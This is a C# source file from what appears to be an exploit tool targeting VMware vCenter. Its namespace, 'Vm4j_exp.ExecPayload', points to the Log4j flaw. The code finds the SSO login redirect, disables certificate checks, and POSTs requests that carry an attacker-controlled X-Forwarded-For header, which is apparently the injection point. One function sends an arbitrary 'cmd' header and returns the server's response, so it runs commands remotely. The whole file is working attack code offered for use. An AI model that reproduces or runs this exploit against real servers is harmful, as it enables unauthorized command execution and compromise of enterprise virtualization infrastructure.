using System;
using System.IO;
using System.Net;
using System.Text;

namespace Vm4j_exp.ExecPayload
{
    class VCenter
    {
        private static string redircetUrl, ssoDomain;
        private static string UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36";
        private static int Timeout = 10000;
        public static string GetRedirctUrl(string url)
        {
            Log log = new Log();
            //get redirectUrl
            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url.EndsWith("/") ? url + "ui/login" : url + "/ui/login");
                //System.Net.WebProxy proxy = new WebProxy("127.0.0.1", 8080);
                //request.Proxy = proxy;
                request.AllowAutoRedirect = false;
                request.UserAgent = UserAgent;
                request.KeepAlive = false;
                request.Accept = "*/*";
                request.Timeout = Timeout;
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                if (response.StatusCode == HttpStatusCode.Redirect || response.StatusCode == HttpStatusCode.MovedPermanently)
                {
                    redircetUrl = response.Headers["Location"];
                    string _ssoDomain = redircetUrl.Split('?')[0];
                    string[] str = _ssoDomain.Split('/');
                    ssoDomain = str[str.Length - 1];
                    log.LogSuccess("Get redirect URL Success");
                    log.LogInfo("SSOdomain =>" + ssoDomain);
                }
                response.Close();
                return redircetUrl;
            }
            catch (Exception e)
            {
                log.LogError("Get Error:" + e);
                return null;
            }
        }
        public static string VCenterEcho(string url, string cmd, string xffHeader)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            ServicePointManager.Expect100Continue = false;
            Log log = new Log();
            string redirectUrl = GetRedirctUrl(url);
            string postdata = "CastleAuthorization=Basic%20dm00ajp2bTRq";
            if (redirectUrl == null)
            {
                log.LogError("Get Redirect URL failed.");
                return null;
            }
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(redirectUrl);
                //System.Net.WebProxy proxy = new WebProxy("127.0.0.1", 8080);
                //request.Proxy = proxy;
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.UserAgent = UserAgent;
                request.KeepAlive = false;
                request.Accept = "*/*";
                request.Timeout = Timeout;
                request.Headers.Add("X-Forwarded-For", xffHeader);
                request.Headers.Add("cmd", cmd);
                byte[] data = Encoding.UTF8.GetBytes(postdata);
                request.ContentLength = data.Length;
                //request.ProtocolVersion = HttpVersion.Version10;
                using (Stream reqStream = request.GetRequestStream())
                {
                    reqStream.Write(data, 0, data.Length);
                }
                StringBuilder sb = new StringBuilder();
                using (HttpWebResponse resp = (HttpWebResponse)request.GetResponse())
                {
                    using (StreamReader reader = new StreamReader(resp.GetResponseStream(), Encoding.UTF8))
                    {
                        try
                        {
                            while (!reader.EndOfStream)
                            {
                                sb.Append((char)reader.Read());
                            }
                        }
                        catch (IOException e)
                        {
                            log.LogError("Get Error:" + e.Message);
                        }
                    }
                }
                string result = sb.ToString();
                return result;
            }
            catch (Exception e)
            {
                log.LogError("Get Error:" + e.Message);
                return "false";
            }
        }
        public static string VCenterExec(string url, string xffHeader)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            ServicePointManager.Expect100Continue = false;
            Log log = new Log();
            string redirectUrl = GetRedirctUrl(url);
            string postdata = "CastleAuthorization=Basic%20dm00ajp2bTRq";
            if (redirectUrl == null)
            {
                log.LogError("Get Redirect URL failed.");
                return null;
            }
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(redirectUrl);
                //System.Net.WebProxy proxy = new WebProxy("127.0.0.1", 8080);
                //request.Proxy = proxy;
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.UserAgent = UserAgent;
                request.KeepAlive = false;
                request.Accept = "*/*";
                request.Timeout = Timeout;
                request.Headers.Add("X-Forwarded-For", xffHeader);
                byte[] data = Encoding.UTF8.GetBytes(postdata);
                request.ContentLength = data.Length;
                //request.ProtocolVersion = HttpVersion.Version10;
                using (Stream reqStream = request.GetRequestStream())
                {
                    reqStream.Write(data, 0, data.Length);
                }
                StringBuilder sb = new StringBuilder();
                using (HttpWebResponse resp = (HttpWebResponse)request.GetResponse())
                {
                    return "true";
                }

            }
            catch (Exception e)
            {
                log.LogError("Get Error:" + e.Message);
                return "false";
            }
        }
    }
}
